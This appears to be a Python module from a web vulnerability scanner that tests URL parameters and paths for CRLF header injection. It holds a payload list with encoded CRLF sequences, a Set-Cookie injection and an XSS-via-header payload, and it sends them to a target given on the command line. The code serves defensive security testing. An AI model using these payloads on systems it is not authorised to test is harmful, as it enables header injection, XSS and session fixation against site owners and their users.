"""
CRLF injection scanner — detect header injection via \r\n in parameters.
Can lead to XSS, cache poisoning, session fixation.
"""

import sys
import os
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.http import HTTPClient
from utils.reporter import Finding

CANARY_HEADER = "X-CRLF-Test"
CANARY_VALUE = "crlf7x3k"

CRLF_PAYLOADS = [
    # Standard CRLF
    f"%0d%0a{CANARY_HEADER}: {CANARY_VALUE}",
    f"%0D%0A{CANARY_HEADER}: {CANARY_VALUE}",
    f"\r\n{CANARY_HEADER}: {CANARY_VALUE}",

    # Double encoding
    f"%250d%250a{CANARY_HEADER}: {CANARY_VALUE}",
    f"%25%30d%25%30a{CANARY_HEADER}: {CANARY_VALUE}",

    # Unicode
    f"%E5%98%8A%E5%98%8D{CANARY_HEADER}: {CANARY_VALUE}",

    # Mixed
    f"%0d%0a%20{CANARY_HEADER}: {CANARY_VALUE}",
    f"%0a{CANARY_HEADER}: {CANARY_VALUE}",
    f"%0d{CANARY_HEADER}: {CANARY_VALUE}",

    # With XSS payload (header injection -> XSS)
    "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>",

    # Set-Cookie injection
    f"%0d%0aSet-Cookie: {CANARY_VALUE}=injected",
]


def test_url(url, client=None, verbose=True):
    """Test URL parameters for CRLF injection."""
    client = client or HTTPClient(timeout=10, retries=1)
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    test_targets = list(params.keys()) if params else ["_crlf_test"]

    for param in test_targets:
        for payload in CRLF_PAYLOADS:
            test_params = dict(params) if params else {}
            test_params[param] = [payload]
            query = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, ""))

            resp = client.get(test_url, allow_redirects=False)
            if not resp:
                continue

            # Check if our header was injected
            if CANARY_HEADER.lower() in {k.lower() for k in resp.headers}:
                findings.append(Finding(
                    title=f"CRLF Injection in '{param}' parameter",
                    severity="high",
                    description=f"Parameter '{param}' allows CRLF injection — arbitrary HTTP headers can be injected.",
                    url=test_url,
                    evidence=f"Payload: {payload}\nInjected header: {CANARY_HEADER}: {CANARY_VALUE}",
                    remediation="Strip or encode \\r\\n characters from all user input before including in HTTP headers.",
                ))
                if verbose:
                    print(f"    [CRLF FOUND] {param} -> header injected!")
                return findings

            # Check for Set-Cookie injection
            set_cookie = resp.headers.get("Set-Cookie", "")
            if CANARY_VALUE in set_cookie:
                findings.append(Finding(
                    title=f"CRLF Injection (Cookie) in '{param}'",
                    severity="high",
                    description=f"CRLF injection allows setting arbitrary cookies via '{param}'.",
                    url=test_url,
                    evidence=f"Payload: {payload}\nSet-Cookie: {set_cookie}",
                    remediation="Strip CRLF characters from user input.",
                ))
                if verbose:
                    print(f"    [CRLF FOUND] Cookie injection via {param}!")
                return findings

            # Check body for header bleed
            if CANARY_VALUE in resp.text and CANARY_HEADER in resp.text:
                findings.append(Finding(
                    title=f"Potential CRLF Injection in '{param}'",
                    severity="medium",
                    description="CRLF characters may be reflected in the response body.",
                    url=test_url,
                    evidence=f"Payload reflected in response body",
                    remediation="Encode CRLF characters in all output contexts.",
                ))

    return findings


def test_path(url, client=None, verbose=True):
    """Test CRLF in the URL path itself."""
    client = client or HTTPClient(timeout=10, retries=1)
    findings = []
    parsed = urlparse(url)

    path_payloads = [
        f"/%0d%0a{CANARY_HEADER}: {CANARY_VALUE}",
        f"/%0D%0A{CANARY_HEADER}: {CANARY_VALUE}",
        f"/%E5%98%8A%E5%98%8D{CANARY_HEADER}: {CANARY_VALUE}",
    ]

    for payload in path_payloads:
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}{payload}"
        resp = client.get(test_url, allow_redirects=False)
        if not resp:
            continue

        if CANARY_HEADER.lower() in {k.lower() for k in resp.headers}:
            findings.append(Finding(
                title="CRLF Injection in URL Path",
                severity="high",
                description="CRLF injection possible via the URL path — headers can be injected.",
                url=test_url,
                evidence=f"Path payload injected {CANARY_HEADER} header",
                remediation="Properly encode URL paths. Strip CRLF from routing.",
            ))
            if verbose:
                print(f"    [CRLF FOUND] Path-based injection!")
            break

    return findings


def scan_multiple(urls, verbose=True):
    all_findings = []
    client = HTTPClient(rate_limit=0.3, timeout=10)
    for url in urls:
        if verbose:
            print(f"  [{url[:80]}] testing CRLF...", flush=True)
        all_findings.extend(test_url(url, client, verbose))
        all_findings.extend(test_path(url, client, verbose))
    return all_findings


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python crlf.py <url>")
        sys.exit(1)
    url = sys.argv[1]
    if not url.startswith("http"):
        url = f"https://{url}"
    print(f"\n[*] CRLF scan: {url}\n")
    findings = test_url(url)
    findings.extend(test_path(url))
    if not findings:
        print("  No CRLF injection found")
